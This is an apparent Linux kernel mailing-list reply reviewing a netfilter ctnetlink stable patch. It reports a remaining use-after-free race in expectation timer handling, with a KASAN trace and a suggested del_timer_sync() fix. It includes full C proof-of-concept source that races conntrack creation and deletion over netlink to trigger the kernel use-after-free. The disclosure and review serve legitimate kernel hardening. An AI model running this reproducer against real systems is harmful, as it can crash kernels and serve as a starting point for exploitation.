Received: from out162-62-58-211.mail.qq.com (out162-62-58-211.mail.qq.com [162.62.58.211])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 221A525392C;
	Sun, 14 Jun 2026 14:38:25 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=162.62.58.211
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1781447910; cv=none; b=VEMY4n3XO7yXvrYu9zOSwIG1wmhfJlADP0fDjJ8XBNj0mzuifle+p8aBK8VUJVq+8a4gIa05s35sdg87eWUWcvGgcOsapxAdDn7y9Xw4GtiMZcc1tS/x7LrKzqiswBMJOPWxdauupG4ot2IMf+2/LdpyrL9e30Mu2I1CYlcqs1E=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1781447910; c=relaxed/simple;
	bh=xBQqvSiz2iHsUo/uYsj+6dOVrGu7OHREl4thd/My1wU=;
	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
	 In-Reply-To:Content-Type; b=uOF6Ost47nAyr1l4pPpMcAiWyrITE0KZ3Rw3/LNfdbmszr9qi769IxrIh8LcKR2wAH9cCmjmuAvB6odeaiR231mFd4LFakXQ2zJefay2i5hH4jho77mt81HJZ9zOu+1D0gx+uKlq0b6EKN2vSFxyylJNRq3DpN63h7tdbE5ZamE=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=jdx/Zpaw; arc=none smtp.client-ip=162.62.58.211
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="jdx/Zpaw"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
	t=1781447901; bh=J0+VJfSrgfB9ORb1LeEuEopCWU/qGcXiIOlDmJdI65c=;
	h=Date:Subject:To:Cc:References:From:In-Reply-To;
	b=jdx/ZpawHL9Ys3QACGgL/VjSukiWlW340Xc+lLyCvNzPCCqPxWG1GNvvYPJxHg3qp
	 ZEluoGWT1TVzrVmKR/74ToxeeAzusepw2Cc6whaIEga2QczsR/Al+RTUVW+0zGU8fY
	 LKJlJZ2dGM2KiHknJR92VnppqTAlz+wyNiXisM3w=
Received: from [192.168.3.157] ([115.156.144.140])
	by newxmesmtplogicsvrsza73-0.qq.com (NewEsmtp) with SMTP
	id 99314642; Sun, 14 Jun 2026 22:38:19 +0800
X-QQ-mid: xmsmtpt1781447899t8gw1b77s
Message-ID: <tencent_DFE6466C14D93204DE976442E459443CB807@qq.com>
X-QQ-XMAILINFO: MpYZqmNm/7vM7EwXJA16HrCSrlL+xw9reXmZPl7S4GYQ7kC45rivWtTz/CAtLF
	 69GmlHC6x9+1ncOtm9DMHBNGvcpyHKPp0eXIdGRpAhznLp21B9JWidnKM+aSCAVfi3uFwHEMNIPn
	 C3/qZSDUvzB7nXm67Zc8+0WZhEhwTtWHMVYJsx3z/SKmK6A4xW5w3nQwSTTo6DwOt7R2iSaTkZ9W
	 a7A3iy1knZOZAiQbHyIMfsQNpzUfP3Ju1BKYl7Qnowbevu/yQPVCKSSL5E8sM/47DStFmE9Dyy97
	 Hbo+C77HDVX1Xvklkif5R+bwndtLNgepXl/Ow5oDYoeTkOjE2dQ7H2e4ruzIWvZkM8P0U/48wLcl
	 nxkl59nm5K86iQmwL/iYkj+PYQ6Kx3MnrpW3iPVlQ4iKsLFVEDvrnYbzWVfHBTN0WAUFLH1XDixS
	 4/0hM3R+Niddk3YVOMRVjiJ16lzsVHYxKVWdVdDiQ52soC6CYZbHxtSmFDwbI8KnslBe39riDAJx
	 dIaduX7JJrQZ0/4LBr2f8dHz53ea69MNOEJs1GiU6l6cbWR+kFfv1J3OOg1DVd8RTTqwnomMvp52
	 uPCzAweIXJatNfi6dCG7+m8vtXeQSthVMF+OsZBCSW5ovZGaO8Cw1ZEpjRqgNdhKbSLcXo9bkF76
	 F2GIl0zuwGbHSVGoS+egj8lT0TZ3l/8cvNANnX1VQy/87Yj8DJz3ippBhU/bVhVHGX8kdEVA0My0
	 RTpERapsyMovhguo89st7CRNYTLeKa37ohNAEi/wXAcvo7dsVulHm4th95qB1J5A8ehGYy7t9F+y
	 3j0mDZZbgsxVhWcPBXHplAaTo4gf7cJZoS3ac3lH0618KLr4hyHNBYkJs0ISCJzjI6EYYLfTUib2
	 v3am0an7YnSylt6ZJvpnnsCjl0bkKOGZQEghh8S4r+hFMrfFrPTcrHi8GceHfpf4a87CeX2AoJIO
	 NwttcNTIvTl+0dKcCC+tOfQaFGGLM+1uOCKkrJ4LQfFeB7U9AUGS663ubNm/YcmcTVWbXlsatssv
	 YKJUf1QJjKRC8kNvd/xWGyQFKFqYjdsRZYppomMhhTgMBCLjEWYHfO75Xo1r4=
X-QQ-XMRINFO: NS+P29fieYNwqS3WCnRCOn9D1NpZuCnCRA==
X-OQ-MSGID: <7f786948-ec3d-4bf9-a2d6-390fedd56304@qq.com>
Date: Sun, 14 Jun 2026 22:38:16 +0800
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [PATCH 6.6.y] netfilter: ctnetlink: ensure safe access to master
 conntrack
To: Mark Bundschuh <mkbund@amazon.com>, stable@vger.kernel.org,
 LKML <linux-kernel@vger.kernel.org>
Cc: netfilter-devel@vger.kernel.org, Pablo Neira Ayuso <pablo@netfilter.org>,
 Florian Westphal <fw@strlen.de>
References: <20260612202408.1045757-1-mkbund@amazon.com>
From: XIAO WU <xiaowu.417@qq.com>
In-Reply-To: <20260612202408.1045757-1-mkbund@amazon.com>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

Hi,

Pablo Neira Ayuso <pablo@netfilter.org> wrote:
 > Holding reference on the expectation is not sufficient, the master
 > conntrack object can just go away, making exp->master invalid.
 >
 > [...]
 >
 > This patch goes for extending the nf_conntrack_expect_lock section
 > to address this issue for simplicity, in the cases that are described
 > below this is just slightly extending the lock section.

I tested this patch on 6.6.142-g005cf9204c4e with KASAN + lockdep
enabled and found that the lock extension in ctnetlink_get_expect()
and ctnetlink_del_expect() does address the expectation-lookup paths,
but one other path still races:

   clean_from_lists()
     nf_ct_remove_expectations()          // holds nf_conntrack_expect_lock
       list_for_each_entry_safe(exp, ...)
         nf_ct_remove_expect(exp)
           del_timer(&exp->timeout)       // returns false if timer is
                                          // already executing on 
another CPU
           // expectation NOT unlinked
   ...
   nf_conntrack_free(ct)                  // master is freed

   // meanwhile, on another CPU:
   nf_ct_expectation_timed_out()          // timer callback fires
     nf_ct_unlink_expect_report(exp, ...) // acquires 
nf_conntrack_expect_lock
       nf_ct_expect_event_report(...)
         e = nf_ct_ecache_find(exp->master);  // UAF -- master already freed

nf_ct_remove_expect() already has the lockdep annotation added by this
patch:

 > +    lockdep_nfct_expect_lock_held();
 > +
 >      if (del_timer(&exp->timeout)) {
 >          nf_ct_unlink_expect(exp);
 >          nf_ct_expect_put(exp);

But holding the lock is not enough: del_timer() cannot cancel a timer
that is already running on another CPU.  When it returns false, the
expectation stays in the hash table, the master is freed immediately
afterward, and the in-flight timer callback hits a dangling exp->master.

The same del_timer() pattern also exists in ctnetlink_del_expect(),
which the patch already extends:

 > +        spin_lock_bh(&nf_conntrack_expect_lock);
 > +
 >          /* bump usage count to 2 */
 >          exp = nf_ct_expect_find_get(info->net, &zone, &tuple);
 > [...]
 >          /* after list removal, usage count == 1 */
 > -        spin_lock_bh(&nf_conntrack_expect_lock);
 >          if (del_timer(&exp->timeout)) {
 >              nf_ct_unlink_expect_report(exp, NETLINK_CB(skb).portid,
 >                             nlmsg_report(info->nlh));

This del_timer() call has the same vulnerability -- just holding the
lock doesn't prevent the timer from executing concurrently before the
lock was acquired.  The timer callback will spin-wait for the lock,
acquire it after ctnetlink_del_expect() drops it, and then access the
now-freed (or about-to-be-freed) master.

I wrote a PoC that triggers this reliably.  It creates a conntrack with
the "tftp" helper attached (which generates expectations), then deletes
the master conntrack via ctnetlink_del_conntrack.  Two threads on
separate CPUs loop this create/delete cycle; within ~50,000 iterations
the expectation timer fires after the master has been freed.

KASAN report (6.6.142-g005cf9204c4e, trimmed):

   ==================================================================
   BUG: KASAN: slab-use-after-free in nf_ct_expect_event_report+0x5a7/0x5f0
   Read of size 1 at addr ffff888107667b84 by task poc/27645

   Call Trace:
    <IRQ>
    dump_stack_lvl+0xd9/0x1b0
    print_report+0xce/0x630
    kasan_report+0xd4/0x110
    nf_ct_expect_event_report+0x5a7/0x5f0       <-- reads exp->master
    nf_ct_unlink_expect_report+0x406/0x720
    nf_ct_expectation_timed_out+0x31/0x50        <-- timer callback
    call_timer_fn+0x1a6/0x590
    __run_timers+0x763/0xb40
    run_timer_softirq+0x5d/0xd0
    ...
    </IRQ>

   Allocated by task 27645 (poc):
    ctnetlink_create_conntrack+0x606/0x1650
    ctnetlink_new_conntrack+0x628/0x10b0
    ...

   Freed by task 27653 (poc):
    nf_conntrack_free+0x109/0x460
    nf_ct_destroy+0x1b0/0x2d0
    ctnetlink_del_conntrack+0x6e9/0x980
    ...

   The buggy address belongs to the object at ffff888107667b80
    which belongs to the cache kmalloc-128 of size 128
   The buggy address is located 4 bytes inside of
    freed 128-byte region [ffff888107667b80, ffff888107667c00)

I think the del_timer() calls in both nf_ct_remove_expect() and
ctnetlink_del_expect() need to be replaced with del_timer_sync() to
properly wait for in-flight timer callbacks before allowing the master
conntrack to be freed.  nf_ct_remove_expect() runs under the spinlock
so it would need to drop the lock, del_timer_sync(), then reacquire and
revalidate, which is the standard pattern for this.

PoC source below.  Build: gcc -Wall -O2 -o poc poc.c -lpthread

---8<--- poc.c ---
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nfnetlink_conntrack.h>
#include <sched.h>

static int open_nl(void) {
     int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
     if (fd < 0) return -1;
     struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
     if (bind(fd, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
         close(fd); return -1;
     }
     return fd;
}

static int do_cmd(int fd, int subsys, int msgtype, int flags,
                   void *attr, int alen) {
     char buf[4096] = {};
     struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
     struct sockaddr_nl sa = { .nl_family = AF_NETLINK };

     nlh->nlmsg_type = (subsys << 8) | msgtype;
     nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | flags;
     nlh->nlmsg_seq = 1;
     int off = NLMSG_HDRLEN;
     struct nfgenmsg *nfg = (struct nfgenmsg *)(buf + off);
     nfg->nfgen_family = AF_INET;
     nfg->version = NFNETLINK_V0;
     nfg->res_id = 0;
     off += sizeof(*nfg);
     if (attr && alen > 0) { memcpy(buf + off, attr, alen); off += alen; }
     nlh->nlmsg_len = off;

     struct iovec siov = { buf, off };
     struct msghdr smsg = { &sa, sizeof(sa), &siov, 1, NULL, 0, 0 };
     if (sendmsg(fd, &smsg, 0) < 0) return -errno;

     fd_set rfds; FD_ZERO(&rfds); FD_SET(fd, &rfds);
     struct timeval tv = { .tv_sec = 3, .tv_usec = 0 };
     if (select(fd + 1, &rfds, NULL, NULL, &tv) <= 0) return -ETIMEDOUT;

     char resp[8192];
     struct sockaddr_nl rsa;
     socklen_t rsalen = sizeof(rsa);
     struct iovec riov = { resp, sizeof(resp) };
     struct msghdr rmsg = { &rsa, rsalen, &riov, 1, NULL, 0, 0 };
     int r = recvmsg(fd, &rmsg, 0);
     if (r < 0) return -errno;

     struct nlmsghdr *rnh = (struct nlmsghdr *)resp;
     if (rnh->nlmsg_type == NLMSG_ERROR)
         return ((struct nlmsgerr *)NLMSG_DATA(rnh))->error;
     return 0;
}

/*
  * Build CT_NEW netlink attributes: conntrack with "tftp-0" helper.
  * The tftp helper creates expectations, so the conntrack acts as
  * a master.  Deleting the master races with the expectation timer.
  */
static int mk_ct_new(char *b) {
     int off = 0, st, ip, pr;
     __u32 s = inet_addr("10.0.0.1"), d = inet_addr("10.0.0.2");
     __u16 sp = 12345, dp = 20000;
     struct nlattr *nla;

     /* CTA_TUPLE_ORIG */
     st = off; nla = (void *)(b + off);
     nla->nla_type = CTA_TUPLE_ORIG | NLA_F_NESTED; off += 4;
     ip = off; nla = (void *)(b + off);
     nla->nla_type = CTA_TUPLE_IP | NLA_F_NESTED; off += 4;
     nla = (void *)(b + off);
     nla->nla_type = CTA_IP_V4_SRC; nla->nla_len = 8;
     *(__u32 *)(b + off + 4) = s; off += 8;
     nla = (void *)(b + off);
     nla->nla_type = CTA_IP_V4_DST; nla->nla_len = 8;
     *(__u32 *)(b + off + 4) = d; off += 8;
     ((struct nlattr *)(b + ip))->nla_len = off - ip;
     pr = off; nla = (void *)(b + off);
     nla->nla_type = CTA_TUPLE_PROTO | NLA_F_NESTED; off += 4;
     nla = (void *)(b + off);
     nla->nla_type = CTA_PROTO_NUM; nla->nla_len = 5;
     *(b + off + 4) = IPPROTO_UDP; off += 8;
     nla = (void *)(b + off);
     nla->nla_type = CTA_PROTO_SRC_PORT; nla->nla_len = 6;
     *(__u16 *)(b + off + 4) = htons(sp); off += 8;
     nla = (void *)(b + off);
     nla->nla_type = CTA_PROTO_DST_PORT; nla->nla_len = 6;
     *(__u16 *)(b + off + 4) = htons(dp); off += 8;
     ((struct nlattr *)(b + pr))->nla_len = off - pr;
     ((struct nlattr *)(b + st))->nla_len = off - st;

     /* CTA_TUPLE_REPLY */
     st = off; nla = (void *)(b + off);
     nla->nla_type = CTA_TUPLE_REPLY | NLA_F_NESTED; off += 4;
     ip = off; nla = (void *)(b + off);
     nla->nla_type = CTA_TUPLE_IP | NLA_F_NESTED; off += 4;
     nla = (void *)(b + off);
     nla->nla_type = CTA_IP_V4_SRC; nla->nla_len = 8;
     *(__u32 *)(b + off + 4) = d; off += 8;
     nla = (void *)(b + off);
     nla->nla_type = CTA_IP_V4_DST; nla->nla_len = 8;
     *(__u32 *)(b + off + 4) = s; off += 8;
     ((struct nlattr *)(b + ip))->nla_len = off - ip;
     pr = off; nla = (void *)(b + off);
     nla->nla_type = CTA_TUPLE_PROTO | NLA_F_NESTED; off += 4;
     nla = (void *)(b + off);
     nla->nla_type = CTA_PROTO_NUM; nla->nla_len = 5;
     *(b + off + 4) = IPPROTO_UDP; off += 8;
     nla = (void *)(b + off);
     nla->nla_type = CTA_PROTO_SRC_PORT; nla->nla_len = 6;
     *(__u16 *)(b + off + 4) = htons(dp); off += 8;
     nla = (void *)(b + off);
     nla->nla_type = CTA_PROTO_DST_PORT; nla->nla_len = 6;
     *(__u16 *)(b + off + 4) = htons(sp); off += 8;
     ((struct nlattr *)(b + pr))->nla_len = off - pr;
     ((struct nlattr *)(b + st))->nla_len = off - st;

     /* CTA_HELP: "tftp-0" -- creates expectations via helper */
     st = off; nla = (void *)(b + off);
     nla->nla_type = CTA_HELP | NLA_F_NESTED; off += 4;
     nla = (void *)(b + off);
     nla->nla_type = CTA_HELP_NAME; nla->nla_len = 11;
     memcpy(b + off + 4, "tftp-0", 7); off += 12;
     ((struct nlattr *)(b + st))->nla_len = off - st;

     /* CTA_TIMEOUT */
     nla = (void *)(b + off);
     nla->nla_type = CTA_TIMEOUT; nla->nla_len = 8;
     *(__u32 *)(b + off + 4) = htonl(3600); off += 8;
     return off;
}

/* Build CT_DEL: delete the conntrack by original tuple */
static int mk_ct_del(char *b) {
     int off = 0, ip, pr;
     __u32 s = inet_addr("10.0.0.1"), d = inet_addr("10.0.0.2");
     __u16 sp = 12345, dp = 20000;
     struct nlattr *nla;

     nla = (void *)(b + off);
     nla->nla_type = CTA_TUPLE_ORIG | NLA_F_NESTED; off += 4;
     ip = off; nla = (void *)(b + off);
     nla->nla_type = CTA_TUPLE_IP | NLA_F_NESTED; off += 4;
     nla = (void *)(b + off);
     nla->nla_type = CTA_IP_V4_SRC; nla->nla_len = 8;
     *(__u32 *)(b + off + 4) = s; off += 8;
     nla = (void *)(b + off);
     nla->nla_type = CTA_IP_V4_DST; nla->nla_len = 8;
     *(__u32 *)(b + off + 4) = d; off += 8;
     ((struct nlattr *)(b + ip))->nla_len = off - ip;
     pr = off; nla = (void *)(b + off);
     nla->nla_type = CTA_TUPLE_PROTO | NLA_F_NESTED; off += 4;
     nla = (void *)(b + off);
     nla->nla_type = CTA_PROTO_NUM; nla->nla_len = 5;
     *(b + off + 4) = IPPROTO_UDP; off += 8;
     nla = (void *)(b + off);
     nla->nla_type = CTA_PROTO_SRC_PORT; nla->nla_len = 6;
     *(__u16 *)(b + off + 4) = htons(sp); off += 8;
     nla = (void *)(b + off);
     nla->nla_type = CTA_PROTO_DST_PORT; nla->nla_len = 6;
     *(__u16 *)(b + off + 4) = htons(dp); off += 8;
     ((struct nlattr *)(b + pr))->nla_len = off - pr;
     ((struct nlattr *)(b + 0))->nla_len = off;
     return off;
}

struct ta { int fd; volatile int stop; volatile unsigned long c; };

void *runner(void *a) {
     struct ta *t = a;
     char b[3000];
     cpu_set_t cpu; CPU_ZERO(&cpu); CPU_SET(0, &cpu);
     sched_setaffinity(0, sizeof(cpu), &cpu);
     while (!t->stop) {
         do_cmd(t->fd, NFNL_SUBSYS_CTNETLINK, IPCTNL_MSG_CT_DELETE,
                0, b, mk_ct_del(b));
         int l = mk_ct_new(b);
         do_cmd(t->fd, NFNL_SUBSYS_CTNETLINK, IPCTNL_MSG_CT_NEW,
                NLM_F_CREATE | NLM_F_EXCL, b, l);
         t->c++;
         if (t->c % 1000 == 0) printf("[CPU0] %lu\n", t->c);
     }
     return 0;
}

int main(void) {
     int fd, l, r;
     char b[3000];
     pthread_t th;
     struct ta ta = {0};
     unsigned long c = 0;
     cpu_set_t cpu;

     printf("[+] UAF PoC: ctnetlink expect master race\n");
     fd = open_nl();
     if (fd < 0) { perror("open_nl"); return 1; }

     /* Sanity check: one full create/delete cycle */
     l = mk_ct_new(b);
     r = do_cmd(fd, NFNL_SUBSYS_CTNETLINK, IPCTNL_MSG_CT_NEW,
                NLM_F_CREATE | NLM_F_EXCL, b, l);
     printf("[+] Initial CT_NEW: %d\n", r);
     if (r == 0) {
         l = mk_ct_del(b);
         r = do_cmd(fd, NFNL_SUBSYS_CTNETLINK, IPCTNL_MSG_CT_DELETE,
                    0, b, l);
         printf("[+] Initial CT_DEL: %d\n", r);
     }

     /*
      * Race: CPU 0 and CPU 1 both run a tight loop of
      * CT_NEW (with tftp helper -> expectations) then CT_DELETE.
      * When the master conntrack is destroyed via
      * ctnetlink_del_conntrack -> nf_conntrack_free(),
      * the expectation's timer may fire afterward and dereference
      * the freed exp->master.
      */
     printf("[+] Starting create/delete race on CPUs 0 and 1\n");
     ta.fd = fd;
     pthread_create(&th, NULL, runner, &ta);
     CPU_ZERO(&cpu); CPU_SET(1, &cpu);
     sched_setaffinity(0, sizeof(cpu), &cpu);
     while (c < 50000 && !ta.stop) {
         do_cmd(fd, NFNL_SUBSYS_CTNETLINK, IPCTNL_MSG_CT_DELETE,
                0, b, mk_ct_del(b));
         do_cmd(fd, NFNL_SUBSYS_CTNETLINK, IPCTNL_MSG_CT_NEW,
                NLM_F_CREATE | NLM_F_EXCL, b, mk_ct_new(b));
         c++;
         if (c % 1000 == 0) printf("[CPU1] %lu\n", c);
     }
     ta.stop = 1;
     pthread_join(th, NULL);
     printf("[+] CPU0: %lu iters, CPU1: %lu iters\n", ta.c, c);
     printf("[+] Done. Check dmesg for KASAN report.\n");
     close(fd);
     return 0;
}


Hope this is helpful.

Thanks,
Xiao

